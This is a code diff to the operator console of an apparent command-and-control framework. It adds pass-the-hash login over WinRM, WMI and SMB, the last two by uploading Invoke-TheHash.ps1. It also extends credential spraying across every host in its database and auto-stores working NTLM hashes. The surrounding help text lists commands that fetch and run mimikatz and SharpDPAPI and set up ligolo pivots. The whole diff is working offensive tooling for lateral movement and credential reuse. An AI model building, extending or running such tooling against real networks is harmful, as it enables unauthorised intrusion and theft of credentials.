@@ -27,10 +27,14 @@ Interact mode  (prompt changes to [agent_id] >):
   secretsdump <tool> <args>                      — download tool + run (e.g. mimikatz.exe args)
   dpapi <tool> <args>                            — download tool + run (e.g. SharpDPAPI.exe args)
   authenticate -u <user> -p <pass> [-s <svc>] [-c <cmd>] <target_ip>
-                                                 — sweep all recon-detected services on target (winrm/smb/wmi).
-                                                   use -s to force one service; -c to run a custom command.
-                                                   successful credentials are auto-stored to the DB.
-  authenticate -u <user> -p <pass> --all         — try the credential against every known host in the DB.
+                                                 — sweep recon-detected services (winrm/smb/wmi). -s forces one service.
+                                                   use -c for a custom command. credentials auto-stored on success.
+  authenticate -u <user> -H <ntlm_hash> [-s <svc>] [-c <cmd>] <target_ip>
+                                                 — Pass-the-Hash. hash format: :NT or LM:NT or 32-hex.
+                                                   winrm (port 5985) → native NTLM in agent (no tool upload, full output).
+                                                   wmi/smb → uploads Invoke-TheHash.ps1 (blind exec, success/fail).
+                                                   auto-selects service from recon data; winrm preferred over wmi/smb.
+  authenticate -u <user> -p <pass>|<hash> --all  — try the credential against every known host in the DB.
   spray <target_ip>                              — try ALL stored credentials against target, show access matrix.
   pivot -connect <ip:port> [-iface ligolo]       — start ligolo-ng proxy on server + deploy agent to target.
                                                    place server/proxy and server/files/agent.exe before use.
@@ -272,19 +276,22 @@ def _parse_tunnel_args(arg):
 # ── Authenticate helpers ──────────────────────────────────────────────────────
 
 def _parse_auth_args(arg):
-    """Parse: -u user -p password [-s service] [-c command] [--all] [target]"""
+    """Parse: -u user (-p pass | -H hash) [-s service] [-c command] [--all] [target]"""
     try:
         tokens = shlex.split(arg, posix=True)
     except ValueError:
         tokens = arg.split()
-    username = password = target = service = command = None
+    username = secret = target = service = command = None
     spray_all = False
+    is_hash   = False
     i = 0
     while i < len(tokens):
         if tokens[i] == "-u" and i + 1 < len(tokens):
             username = tokens[i + 1]; i += 2
         elif tokens[i] == "-p" and i + 1 < len(tokens):
-            password = tokens[i + 1]; i += 2
+            secret = tokens[i + 1]; i += 2
+        elif tokens[i] == "-H" and i + 1 < len(tokens):
+            secret = tokens[i + 1]; is_hash = True; i += 2
         elif tokens[i] == "-s" and i + 1 < len(tokens):
             service = tokens[i + 1].lower(); i += 2
         elif tokens[i] == "-c" and i + 1 < len(tokens):
@@ -293,7 +300,7 @@ def _parse_auth_args(arg):
             spray_all = True; i += 1
         else:
             target = tokens[i]; i += 1
-    return username, password, target, service, command, spray_all
+    return username, secret, target, service, command, spray_all, is_hash
 
 
 def _services_for_target(target_ip):
@@ -316,6 +323,27 @@ def _services_for_target(target_ip):
                     services.append(svc)
             return services
     return None  # not found in DB
+
+
+def _preferred_pth_service(target_ip):
+    """
+    Pick the best service for PTH based on open ports:
+    winrm (5985) → native NTLM in agent, full output.
+    wmi  (135)   → Invoke-TheHash, blind exec.
+    smb  (445)   → Invoke-TheHash, blind exec.
+    Returns None if target is not in DB.
+    """
+    hosts = _get("/hosts")
+    if not hosts:
+        return None
+    for h in hosts:
+        if h["ip"] == target_ip:
+            ports = {int(p) for p in h.get("open_ports", "").split(",") if p.strip().isdigit()}
+            if 5985 in ports: return "winrm"
+            if 135  in ports: return "wmi"
+            if 445  in ports: return "smb"
+            return None
+    return None   # not in DB
 
 
 def _is_auth_failure(output: str) -> bool:
@@ -357,23 +385,24 @@ def _store_credential(agent_id, username, password, source_host, cred_type="plai
     })
 
 
-def _do_auth_sweep(agent_id, username, password, target, services, command=None):
+def _do_auth_sweep(agent_id, username, secret, target, services, command=None, is_hash=False):
     """
     Try each service sequentially, print per-service results, and auto-store
     the credential if any service succeeds (Feature 1).
     """
+    cred_type = "ntlm" if is_hash else "plaintext"
     print(f"[*] Sweeping {len(services)} service(s) on {target}: {', '.join(s.upper() for s in services)}")
     results = {}   # service → (success: bool, output: str | None)
     stored  = False
 
     for svc in services:
         print(f"  [{svc.upper()}] queuing...", flush=True)
-        success, output = _auth_check(agent_id, username, password, target, svc, command)
+        success, output = _auth_check(agent_id, username, secret, target, svc, command)
         results[svc] = (success, output)
 
         # Feature 1 — auto-store on first success
         if success and not stored:
-            _store_credential(agent_id, username, password, target)
+            _store_credential(agent_id, username, secret, target, cred_type=cred_type)
             print(f"  [*] Credential stored to DB ({username} @ {target})")
             stored = True
 
@@ -441,22 +470,34 @@ def _do_spray(agent_id, target):
 
     success_count = 0
     for cred in unique_creds:
-        uname  = cred["username"]
-        secret = cred["secret"]
-        label  = f"{uname} / {secret[:28]}{'…' if len(secret) > 28 else ''}"
+        uname     = cred["username"]
+        secret    = cred["secret"]
+        cred_type = cred.get("cred_type", "plaintext")
+        is_hash   = cred_type == "ntlm"
+        label     = f"{uname} / {secret[:28]}{'…' if len(secret) > 28 else ''}"
 
-        svc_results = {}
-        for svc in available:
+        # For hashes, prefer winrm; skip services without native PTH support when forced
+        eff_services = available
+        if is_hash:
+            pth_svc = _preferred_pth_service(target)
+            if pth_svc:
+                eff_services = [pth_svc] if pth_svc not in available else [pth_svc]
+
+        svc_results = {svc: None for svc in available}
+        for svc in eff_services:
             ok, _ = _auth_check(agent_id, uname, secret, target, svc)
             svc_results[svc] = ok
 
-        any_ok = any(svc_results.values())
+        any_ok = any(v for v in svc_results.values() if v)
         if any_ok:
             success_count += 1
-            _store_credential(agent_id, uname, secret, target)
+            _store_credential(agent_id, uname, secret, target, cred_type=cred_type)
 
         tag     = "+" if any_ok else "-"
-        svc_str = "".join(f"  {'OK' if ok else '--':<{svc_w}}" for ok in svc_results.values())
+        svc_str = "".join(
+            f"  {'OK' if ok else '--' if ok is False else 'N/A':<{svc_w}}"
+            for ok in svc_results.values()
+        )
         print(f"  [{tag}] {label:<{col_w}}{svc_str}")
 
     print(f"\n  {success_count}/{len(unique_creds)} credential(s) granted access on {target}\n")
@@ -464,7 +505,7 @@ def _do_spray(agent_id, target):
 
 # ── Feature 3 — Multi-target spray ───────────────────────────────────────────
 
-def _do_spray_all(agent_id, username, password):
+def _do_spray_all(agent_id, username, secret, is_hash=False):
     """Try one credential against every host in the DB with lateral movement ports open."""
     hosts = _get("/hosts")
     if not hosts:
@@ -497,22 +538,27 @@ def _do_spray_all(agent_id, username, password):
     print(header)
     print("  " + "─" * (col_ip + 2 + col_host + (svc_w + 2) * len(all_svcs)))
 
+    cred_type = "ntlm" if is_hash else "plaintext"
     success_hosts = 0
     stored = False
     for ip, hostname, svcs in targets:
         row_results = {}
+        # For PTH, only try the preferred PTH service to avoid unnecessary tool uploads
+        check_svcs = all_svcs if not is_hash else (
+            ["winrm"] if "winrm" in svcs else ["wmi"] if "wmi" in svcs else ["smb"] if "smb" in svcs else []
+        )
         for svc in all_svcs:
-            if svc not in svcs:
-                row_results[svc] = None   # port not open — skip
+            if svc not in svcs or svc not in check_svcs:
+                row_results[svc] = None   # port not open or skipped — show N/A
                 continue
-            ok, _ = _auth_check(agent_id, username, password, ip, svc)
+            ok, _ = _auth_check(agent_id, username, secret, ip, svc)
             row_results[svc] = ok
 
         any_ok = any(v for v in row_results.values() if v is not None and v)
         if any_ok:
             success_hosts += 1
             if not stored:
-                _store_credential(agent_id, username, password, ip)
+                _store_credential(agent_id, username, secret, ip, cred_type=cred_type)
                 stored = True
 
         tag = "+" if any_ok else "-"
@@ -694,31 +740,51 @@ def handle_interact(line, agent_id):
 
     elif cmd == "authenticate":
         if not arg:
-            print("usage: authenticate -u <user> -p <pass> [-s winrm|smb|wmi] [-c <cmd>] [--all | <target_ip>]")
+            print("usage: authenticate -u <user> (-p <pass>|-H <hash>) [-s winrm|smb|wmi] [-c <cmd>] [--all|<target>]")
         else:
-            username, password, target, service, command, spray_all = _parse_auth_args(arg)
+            username, secret, target, service, command, spray_all, is_hash = _parse_auth_args(arg)
+            cred_type = "ntlm" if is_hash else "plaintext"
 
-            if not username or not password:
-                print("[-] Missing -u / -p. usage: authenticate -u <user> -p <pass> [-s svc] [-c cmd] [--all | <target>]")
+            if not username or not secret:
+                print("[-] Missing -u and -p/-H.  usage: authenticate -u <user> (-p <pass>|-H <hash>) [-s svc] [-c cmd] [--all|<target>]")
             elif spray_all:
                 # Feature 3 — one credential, all known hosts
                 if command:
                     print("[!] -c is ignored with --all")
-                _do_spray_all(agent_id, username, password)
+                _do_spray_all(agent_id, username, secret, is_hash=is_hash)
             elif service:
                 # Forced service — single auth with optional custom command
                 if not target:
                     print("[-] Missing target IP.")
                 else:
-                    ok, output = _auth_check(agent_id, username, password, target, service, command)
+                    ok, output = _auth_check(agent_id, username, secret, target, service, command)
                     suffix = f" — running: {command}" if command else ""
                     print(f"[{'+'if ok else'-'}] [{service.upper()}]{suffix}")
                     if output:
                         for line in output.strip().splitlines():
                             print(f"  {line}")
                     if ok:
-                        _store_credential(agent_id, username, password, target)
+                        _store_credential(agent_id, username, secret, target, cred_type=cred_type)
                         print(f"[*] Credential stored to DB ({username} @ {target})")
+            elif is_hash:
+                # PTH auto-route: pick best service from recon data
+                if not target:
+                    print("[-] Missing target IP.")
+                else:
+                    pth_svc = _preferred_pth_service(target)
+                    if pth_svc is None:
+                        print(f"[-] No recon data for {target} — run 'recon' first or specify -s winrm|wmi|smb")
+                    else:
+                        label = "native NTLM (no upload)" if pth_svc == "winrm" else "Invoke-TheHash (blind exec)"
+                        print(f"[*] PTH via {pth_svc.upper()} — {label}")
+                        ok, output = _auth_check(agent_id, username, secret, target, pth_svc, command)
+                        print(f"[{'+'if ok else'-'}] [{pth_svc.upper()}]")
+                        if output:
+                            for line in output.strip().splitlines():
+                                print(f"  {line}")
+                        if ok:
+                            _store_credential(agent_id, username, secret, target, cred_type="ntlm")
+                            print(f"[*] Hash stored to DB ({username} @ {target})")
             else:
                 # Auto-sweep all recon-detected services on target
                 if not target:
@@ -732,7 +798,7 @@ def handle_interact(line, agent_id):
                     elif not available:
                         print(f"[-] No lateral movement ports found for {target} in recon data")
                     else:
-                        _do_auth_sweep(agent_id, username, password, target, available)
+                        _do_auth_sweep(agent_id, username, secret, target, available, is_hash=is_hash)
 
     elif cmd == "aclabuse":
         _ACLABUSE_USAGE = {
